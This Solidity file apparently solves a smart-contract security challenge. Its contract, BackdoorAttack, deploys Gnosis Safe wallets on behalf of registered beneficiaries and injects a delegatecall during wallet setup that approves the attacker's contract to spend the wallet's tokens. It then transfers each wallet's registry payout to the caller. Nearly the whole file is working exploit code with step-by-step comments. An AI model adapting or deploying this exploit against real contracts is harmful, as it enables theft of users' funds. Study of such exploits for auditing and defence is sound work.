// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";


interface IWalletRegistry is IProxyCreationCallback {
    function masterCopy() external view returns(address);
    function walletFactory() external view returns(address);
    function token() external view returns(IERC20);
}

interface IGnosisSafe {
    /// @dev Setup function sets initial storage of contract.
    /// @param _owners List of Safe owners.
    /// @param _threshold Number of required confirmations for a Safe transaction.
    /// @param to Contract address for optional delegate call.
    /// @param data Data payload for optional delegate call.
    /// @param fallbackHandler Handler for fallback calls to this contract
    /// @param paymentToken Token that should be used for the payment (0 is ETH)
    /// @param payment Value that should be paid
    /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

interface IGnosisSafeProxyFactory {
    /// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction
    /// @param _singleton Address of singleton contract.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized.
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (IGnosisSafe proxy);
}


contract BackdoorAttack {
    
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18, from WalletRegistry.sol
    
    function attack(address walletRegistry, address[] calldata initialBeneficiaries) external {
        IWalletRegistry registry = IWalletRegistry(walletRegistry);
        
        // base GnosisSafe contract, its functions are always executed trough a proxy contract (deployed safe wallet)
        address masterCopy = registry.masterCopy();
        
        // factory contract which deploys proxy contract (safe wallet)
        IGnosisSafeProxyFactory walletFactory = IGnosisSafeProxyFactory(registry.walletFactory());
        
        // this token is sent to a safe wallet by the registry once it's deployed
        IERC20 token = registry.token();
        
        // for each beneficiary in the registry:
        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            // convert beneficiary address to address[]
            address[] memory owners = new address[](1);
            owners[0] = initialBeneficiaries[i];
            
            // 1. create safe wallet for beneficiary, i.e. deploy proxy contract
            IGnosisSafe safeWallet = walletFactory.createProxyWithCallback(
                masterCopy, // use GnosisSafe implementation
                abi.encodeWithSelector(IGnosisSafe.setup.selector, // initialize GnosisSafe wallet
                    owners, 1, // just one owner, the beneficiary
                    
                    // delegatecall our approve function during wallet initialization
                    // which allows us to withdraw tokens later ... THIS IS THE BACKDOOR!
                    address(this), abi.encodeWithSelector(BackdoorAttack.approve.selector,
                        token, address(this), TOKEN_PAYMENT
                    ),
                    
                    address(0), // no fallback handler
                    address(0), 0, address(0) // no payment token or intial paymment
                ),
                i, // salt nonce to make sure created wallets have different addresses
                registry // callback to execute 'proxyCreated' function of the registry in order to get the promised tokens
            );
            
            // 3. transfer tokens from the created wallet to the attacker
            token.transferFrom(address(safeWallet), msg.sender, TOKEN_PAYMENT);
        }
    }
    
    // 2. this function is called from the safe wallet contract (delegatecall),
    //    so we can approve our contract to spend tokens on behalf of the original beneficiary
    function approve(IERC20 token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
    
}
